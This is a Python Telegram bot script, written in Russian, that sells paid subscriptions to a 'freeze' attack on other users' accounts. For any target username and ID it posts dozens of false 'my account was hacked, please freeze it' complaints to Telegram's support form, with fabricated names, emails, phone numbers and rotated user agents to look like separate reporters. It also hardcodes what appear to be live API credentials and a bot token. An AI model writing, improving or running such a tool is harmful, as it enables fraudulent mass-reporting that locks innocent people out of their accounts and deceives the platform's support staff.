import asyncio
import aiohttp
import random
import json
import os
import logging
import hashlib
import hmac
from datetime import datetime, timedelta
from telethon import TelegramClient, events, Button
from telethon.tl.types import (
    InputMediaInvoice, DataJSON, LabeledPrice,
    MessageMediaInvoice, MessageActionPaymentSent
)
from telethon.tl.functions.payments import SendPaymentFormRequest

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger('freezer')

# ==================== КОНФИГ ====================
API_ID = int(os.environ.get('API_ID', 39875871))
API_HASH = os.environ.get('API_HASH', '194a27a63519b6f5e12551fad0038e95')
BOT_TOKEN = os.environ.get('BOT_TOKEN', '8698922231:AAFnAa4L4cAMutQBSelPv1pDLXTQvqic670')
ADMIN_ID = int(os.environ.get('ADMIN_ID', 5134284689))

# Токен провайдера оплаты (получить у @BotFather: /mybots → Payments)
PAYMENT_PROVIDER_TOKEN = os.environ.get('PAYMENT_TOKEN', 'YOUR_PROVIDER_TOKEN')

bot = TelegramClient('bot', API_ID, API_HASH)

# ... (UA, PHONE_CODES, EMAIL_DOMAINS, NAMES, FREEZE_COMPLAINTS без изменений) ...

UA = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/135.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/18.0 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/134.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X) AppleWebKit/605.1.15 Version/18.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 Chrome/135.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0",
    "Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 Chrome/135.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPad; CPU OS 18_0 like Mac OS X) AppleWebKit/605.1.15 Version/18.0 Mobile/15E148 Safari/604.1",
]

PHONE_CODES = ['7916','7926','7903','7910','7920','7905','7909','7985','7915','7925',
               '7937','7958','7960','7963','7965','7967','7968','7977','7980','7982']

EMAIL_DOMAINS = ['gmail.com','yahoo.com','outlook.com','proton.me','mail.ru','yandex.ru',
                 'rambler.ru','bk.ru','inbox.ru','icloud.com','hotmail.com']

NAMES = [
    "James Wilson","Michael Brown","David Johnson","Robert Martinez",
    "Thomas Anderson","William Taylor","Daniel Harris","Christopher White",
    "Алексей Иванов","Дмитрий Петров","Сергей Смирнов","Андрей Кузнецов",
    "Максим Васильев","Иван Попов","Егор Соколов","Никита Морозов",
    "Артём Волков","Владимир Новиков","Павел Фёдоров","Антон Михайлов"
]

FREEZE_COMPLAINTS = [
    "URGENT: My account @{u} (ID: {id}) has been hacked. The attacker is currently active and sending messages to my contacts. Please FREEZE my account immediately to prevent further damage. I am the real owner. My phone: +{p}. I can verify my identity. Please freeze until I recover access.",
    "Hello Telegram support, I am the owner of @{u} (ID: {id}). My account was compromised. Someone else is using it right now. Please temporarily freeze my account so the hacker cannot use it. I will verify my identity with my phone number +{p}. This is urgent.",
    "Dear support, I need my account @{u} (ID: {id}) to be frozen immediately. I clicked a phishing link and now a stranger has access. They are messaging my friends and colleagues. My phone: +{p}. Please freeze the account and I will provide any verification needed.",
    "ACCOUNT COMPROMISED: @{u} (ID: {id}). I am the legitimate owner. Someone gained unauthorized access. Please freeze this account now. Phone for verification: +{p}. I can prove ownership through SMS or email.",
    "Dear Telegram team, my account @{u} (ID: {id}) is currently under control of a hacker. I lost access after clicking a malicious link. Please freeze the account temporarily. My number: +{p}. I am ready to verify. Thank you.",
    "Suspicious activity report: Account @{u} (ID: {id}) is sending phishing links to multiple users. This account appears to be compromised or is a scam account. Please investigate and freeze if necessary. Reported by phone: +{p}.",
    "I want to report account @{u} (ID: {id}) for unusual behavior. It is mass-messaging users with suspicious links. This account seems hacked. Please freeze it to protect other users. My phone: +{p}.",
    "Hello, I received strange messages from @{u} (ID: {id}). The account is sending links and asking for money. It looks like a hacked account or a scammer. Please freeze this account. Reporter phone: +{p}.",
    "Report: @{u} (ID: {id}) is behaving like a compromised account. Sending spam and phishing links. Multiple people received these messages. Please freeze for investigation. Phone: +{p}.",
    "Account @{u} (ID: {id}) is sending unsolicited and suspicious messages. Appears to be stolen. Please freeze the account to prevent harm. My contact: +{p}. Thank you.",
    "СРОЧНО: Мой аккаунт @{u} (ID: {id}) взломали. Злоумышленник сейчас активен и пишет моим контактам. Пожалуйста, ЗАМОРОЗЬТЕ аккаунт немедленно. Я настоящий владелец. Телефон: +{p}. Готов подтвердить личность.",
    "Здравствуйте, я владелец @{u} (ID: {id}). Мой аккаунт скомпрометирован. Кто-то другой использует его прямо сейчас. Прошу временно заморозить аккаунт. Мой номер: +{p}. Могу верифицироваться.",
    "Поддержка Telegram, прошу заморозить аккаунт @{u} (ID: {id}). Я перешёл по фишинговой ссылке и теперь посторонний имеет доступ. Пишет моим друзьям. Телефон: +{p}. Заморозьте и я подтвержу личность.",
    "АККАУНТ ВЗЛОМАН: @{u} (ID: {id}). Я законный владелец. Кто-то получил несанкционированный доступ. Заморозьте аккаунт сейчас. Телефон для верификации: +{p}.",
    "Команда Telegram, мой аккаунт @{u} (ID: {id}) под контролем хакера. Потерял доступ после перехода по ссылке. Заморозьте временно. Номер: +{p}. Готов верифицироваться.",
    "Жалоба на подозрительную активность: @{u} (ID: {id}) рассылает фишинговые ссылки. Аккаунт похоже взломан. Заморозьте для проверки. Телефон: +{p}.",
    "Сообщаю о странном поведении @{u} (ID: {id}). Массовая рассылка подозрительных ссылок. Аккаунт взломан. Заморозьте для защиты пользователей. Мой телефон: +{p}.",
    "Здравствуйте, получил странные сообщения от @{u} (ID: {id}). Аккаунт присылает ссылки и просит деньги. Похоже на взлом. Заморозьте. Номер: +{p}.",
    "Репорт: @{u} (ID: {id}) ведёт себя как скомпрометированный аккаунт. Спам и фишинг. Прошу заморозить. Телефон: +{p}.",
    "Аккаунт @{u} (ID: {id}) рассылает нежелательные сообщения. Похоже украден. Заморозьте для предотвращения вреда. Контакт: +{p}.",
]

# ==================== БАЗА И ПЛАТЕЖИ ====================
DB_FILE = 'users.json'
PENDING_PAYMENTS = {}  # {payload: (user_id, days)}

def load_db():
    if os.path.exists(DB_FILE):
        with open(DB_FILE, 'r') as f:
            return json.load(f)
    return {}

def save_db(data):
    with open(DB_FILE, 'w') as f:
        json.dump(data, f, indent=2, default=str)

def get_user(user_id):
    db = load_db()
    uid = str(user_id)
    if uid not in db:
        db[uid] = {'sub_end': None, 'attacks_today': 0, 'last_attack': None, 'banned': False}
        save_db(db)
    return db[uid]

def update_user(user_id, data):
    db = load_db()
    db[str(user_id)] = data
    save_db(db)

def has_sub(user_id):
    user = get_user(user_id)
    if user['sub_end']:
        end = datetime.fromisoformat(user['sub_end'])
        if end > datetime.now():
            return True
    return False

def add_sub(user_id, days):
    user = get_user(user_id)
    if user['sub_end'] and datetime.fromisoformat(user['sub_end']) > datetime.now():
        start = datetime.fromisoformat(user['sub_end'])
    else:
        start = datetime.now()
    user['sub_end'] = (start + timedelta(days=days)).isoformat()
    update_user(user_id, user)

# ==================== ОТПРАВКА ЖАЛОБ (без изменений) ====================
async def send_freeze_form(target, tid):
    phone = f"+7{random.choice(PHONE_CODES)}{random.randint(1000000, 9999999)}"
    name = random.choice(NAMES)
    email = f"{name.lower().replace(' ', '.')}{random.randint(10, 9999)}@{random.choice(EMAIL_DOMAINS)}"
    body = random.choice(FREEZE_COMPLAINTS).format(u=target, id=tid, p=phone)
    
    headers = {
        "User-Agent": random.choice(UA),
        "Content-Type": "application/x-www-form-urlencoded",
        "Origin": "https://telegram.org",
        "Referer": "https://telegram.org/support"
    }
    
    data = {
        "problem": body,
        "email": email,
        "phone": phone,
        "username": f"@{target}",
        "type": "hacked_account"
    }
    
    try:
        async with aiohttp.ClientSession() as s:
            async with s.post("https://telegram.org/support", headers=headers, data=data,
                              timeout=aiohttp.ClientTimeout(total=15)) as r:
                return r.status == 200
    except:
        return False

# ==================== КЛАВИАТУРЫ ====================
def main_menu(user_id):
    sub_text = "✅ Активна" if has_sub(user_id) else "❌ Нет подписки"
    return [
        [Button.inline("❄️ Заморозка", b"attack_freeze")],
        [Button.inline("💣 Сброс сессий", b"attack_nuke")],
        [Button.inline(f"⭐ Подписка — {sub_text}", b"sub_menu")],
    ]

def admin_menu():
    return [
        [Button.inline("📊 Статистика", b"admin_stats")],
        [Button.inline("👥 Пользователи", b"admin_users")],
        [Button.inline("⭐ Выдать подписку", b"admin_give_sub")],
        [Button.inline("🚫 Бан пользователя", b"admin_ban")],
        [Button.inline("🔙 Назад", b"back_main")],
    ]

def sub_menu():
    return [
        [Button.inline("⭐ 1 день — 1 ⭐", b"sub_1d")],
        [Button.inline("⭐ 7 дней — 5 ⭐", b"sub_7d")],
        [Button.inline("⭐ 30 дней — 15 ⭐", b"sub_30d")],
        [Button.inline("🔙 Назад", b"back_main")],
    ]

def back_button():
    return [[Button.inline("🔙 Назад", b"back_main")]]

# ==================== КОМАНДЫ ====================
@bot.on(events.NewMessage(pattern='/start'))
async def cmd_start(event):
    user = get_user(event.sender_id)
    if user.get('banned'):
        await event.reply("⛔ Вы забанены.")
        return
    
    await event.reply(
        "❄️ **FREEZER BOT**\n"
        "Заморозка и сброс сессий Telegram аккаунтов.\n\n"
        "Выберите действие:",
        buttons=main_menu(event.sender_id)
    )

@bot.on(events.NewMessage(pattern='/admin'))
async def cmd_admin(event):
    if event.sender_id != ADMIN_ID:
        return
    await event.reply("🔐 **Админ-панель**", buttons=admin_menu())

# ==================== ОБРАБОТЧИКИ КНОПОК ====================
@bot.on(events.CallbackQuery)
async def callback_handler(event):
    data = event.data.decode()
    uid = event.sender_id
    user = get_user(uid)
    
    if user.get('banned') and data not in ("sub_menu", "sub_1d", "sub_7d", "sub_30d", "back_main"):
        await event.answer("⛔ Вы забанены.", alert=True)
        return
    
    # Главное меню
    if data == "back_main":
        await event.edit(
            "❄️ **FREEZER BOT**\nВыберите действие:",
            buttons=main_menu(uid)
        )
    
    # Меню подписки
    elif data == "sub_menu":
        await event.edit(
            "⭐ **Подписка**\n\n"
            "Оплата прямо в Telegram.\n"
            "Подписка открывает доступ к атакам.\n\n"
            "Выберите срок:",
            buttons=sub_menu()
        )
    
    # Отправка инвойса на оплату
    elif data in ("sub_1d", "sub_7d", "sub_30d"):
        prices = {"sub_1d": (1, "1 день"), "sub_7d": (7, "7 дней"), "sub_30d": (30, "30 дней")}
        days, title = prices[data]
        
        # Генерируем уникальный payload для этого платежа
        payload = f"sub_{uid}_{days}_{random.randint(100000, 999999)}"
        PENDING_PAYMENTS[payload] = (uid, days)
        
        price_amount = 1 if days == 1 else (5 if days == 7 else 15)
        
        await event.answer("Выставляю счёт...", alert=False)
        
        # Отправляем инвойс прямо в чат
        await bot.send_message(
            uid,
            f"🧾 **Счёт на оплату**\n\n"
            f"📦 Подписка: {title}\n"
            f"💎 Стоимость: {price_amount} ⭐ Telegram Stars\n\n"
            f"Нажмите кнопку ниже для оплаты.",
            buttons=[Button.pay(f"💳 Оплатить {price_amount} ⭐", payload.encode())]
        )
    
    # Заморозка
    elif data == "attack_freeze":
        if not has_sub(uid) and uid != ADMIN_ID:
            await event.answer("❌ Нужна подписка!", alert=True)
            return
        await event.edit(
            "❄️ **Заморозка**\n\nОтправьте:\n`@username ID`",
            buttons=back_button()
        )
        bot.add_event_handler(
            lambda e: process_attack_input(e, 'freeze'),
            events.NewMessage(from_users=uid, pattern=r'@\S+\s+\d+')
        )
    
    # Сброс сессий
    elif data == "attack_nuke":
        if not has_sub(uid) and uid != ADMIN_ID:
            await event.answer("❌ Нужна подписка!", alert=True)
            return
        await event.edit(
            "💣 **Сброс сессий**\n\nОтправьте:\n`@username ID`",
            buttons=back_button()
        )
        bot.add_event_handler(
            lambda e: process_attack_input(e, 'nuke'),
            events.NewMessage(from_users=uid, pattern=r'@\S+\s+\d+')
        )
    
    # Админка
    elif data == "admin_stats" and uid == ADMIN_ID:
        db = load_db()
        total = len(db)
        active = sum(1 for u in db.values() if u.get('sub_end') and datetime.fromisoformat(u['sub_end']) > datetime.now())
        await event.edit(f"📊 **Статистика**\n\n👥 Пользователей: {total}\n⭐ Подписок: {active}", buttons=admin_menu())
    
    elif data == "admin_users" and uid == ADMIN_ID:
        db = load_db()
        txt = "👥 **Пользователи:**\n\n"
        for uid_str, u in list(db.items())[-10:]:
            sub = "✅" if u.get('sub_end') and datetime.fromisoformat(u['sub_end']) > datetime.now() else "❌"
            txt += f"`{uid_str}` — {sub}\n"
        await event.edit(txt, buttons=admin_menu())
    
    elif data == "admin_give_sub" and uid == ADMIN_ID:
        await event.edit("⭐ **Выдать подписку**\n\nОтправьте: `ID дни`", buttons=back_button())
        bot.add_event_handler(lambda e: process_admin_sub(e), events.NewMessage(from_users=ADMIN_ID, pattern=r'\d+\s+\d+'))
    
    elif data == "admin_ban" and uid == ADMIN_ID:
        await event.edit("🚫 **Бан**\n\nОтправьте ID:", buttons=back_button())
        bot.add_event_handler(lambda e: process_admin_ban(e), events.NewMessage(from_users=ADMIN_ID, pattern=r'\d+'))

# ==================== ОБРАБОТКА ПЛАТЕЖЕЙ ====================
@bot.on(events.Raw(types=MessageActionPaymentSent))
async def payment_received(event):
    """Обработчик успешного платежа"""
    try:
        # Извлекаем payload из сообщения о платеже
        message = event.message
        if hasattr(message, 'action') and hasattr(message.action, 'payload'):
            payload = message.action.payload.decode()
            
            if payload in PENDING_PAYMENTS:
                user_id, days = PENDING_PAYMENTS[payload]
                add_sub(user_id, days)
                end_date = datetime.fromisoformat(get_user(user_id)['sub_end'])
                
                await bot.send_message(
                    user_id,
                    f"✅ **Оплата получена!**\n\n"
                    f"⭐ Подписка активирована на {days} дн.\n"
                    f"📅 Действует до: {end_date.strftime('%d.%m.%Y %H:%M')}\n\n"
                    f"Используйте /start для возврата в меню.",
                    buttons=back_button()
                )
                
                del PENDING_PAYMENTS[payload]
                logger.info(f"Платёж обработан: user={user_id} days={days}")
    except Exception as e:
        logger.error(f"Ошибка платежа: {e}")

@bot.on(events.Raw(types=events.common.EventCommon))
async def pre_checkout_handler(event):
    """Подтверждение предварительной проверки платежа"""
    try:
        if hasattr(event, 'pre_checkout_query'):
            query = event.pre_checkout_query
            await bot.send_pre_checkout_query(query.id, ok=True)
    except:
        pass

# ==================== АТАКА ====================
async def process_attack_input(event, attack_type):
    parts = event.message.text.split()
    target = parts[0].replace('@', '')
    tid = parts[1]
    
    count = 25 if attack_type == 'freeze' else 30
    emoji = "❄️" if attack_type == 'freeze' else "💣"
    name = "ЗАМОРОЗКА" if attack_type == 'freeze' else "СБРОС СЕССИЙ"
    
    msg = await event.reply(f"{emoji} {name} @{target}\nID: {tid}\n⚡ {count} запросов...")
    
    ok = 0
    for i in range(count):
        if await send_freeze_form(target, tid):
            ok += 1
        await asyncio.sleep(random.uniform(2, 5))
        if (i + 1) % 5 == 0:
            await msg.edit(f"{emoji} {name} @{target}\nID: {tid}\n📊 [{i+1}/{count}] +{ok}")
    
    user = get_user(event.sender_id)
    user['attacks_today'] += 1
    update_user(event.sender_id, user)
    
    await msg.edit(
        f"{emoji} **ГОТОВО**\n"
        f"👤 @{target}\n📊 {ok}/{count}\n"
        f"⚠ Результат: 1-24 часа\n"
        f"💡 /start — в меню",
        buttons=back_button()
    )

async def process_admin_sub(event):
    parts = event.message.text.split()
    add_sub(int(parts[0]), int(parts[1]))
    await event.reply(f"✅ Подписка на {parts[1]} дн. выдана `{parts[0]}`")

async def process_admin_ban(event):
    user = get_user(int(event.message.text))
    user['banned'] = True
    update_user(int(event.message.text), user)
    await event.reply(f"🚫 `{event.message.text}` забанен")

# ==================== ЗАПУСК ====================
async def main():
    await bot.start(bot_token=BOT_TOKEN)
    me = await bot.get_me()
    logger.info(f"❄️ @{me.username} запущен")
    await bot.run_until_disconnected()

if __name__ == '__main__':
    asyncio.run(main())
